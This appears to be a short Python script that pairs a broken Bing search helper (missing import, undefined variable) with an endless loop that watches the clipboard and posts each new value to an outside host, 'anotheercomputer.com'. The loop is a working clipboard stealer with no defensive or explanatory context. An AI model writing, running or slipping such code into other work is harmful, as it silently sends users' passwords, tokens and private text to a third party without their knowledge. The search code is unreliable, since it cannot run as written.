import pyperclip
import requests

def test():
    query = "hello world"
    quoted_query = urllib.quote(query)
    host = 'http://www.bing.com/search?q=%s&go=&qs=n&sk=&sc=8-13&first=%s' % (quoted_query, page)
    req = urllib.request.Request(host)
    req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36')
    response = urllib.request.urlopen(req)
    return response

LAST_VALUE = ""

while True:
    value = pyperclip.paste()
    if value != LAST_VALUE:
        LAST_VALUE = value
        requests.post("https://anotheercomputer.com", data={"clipboard": value})
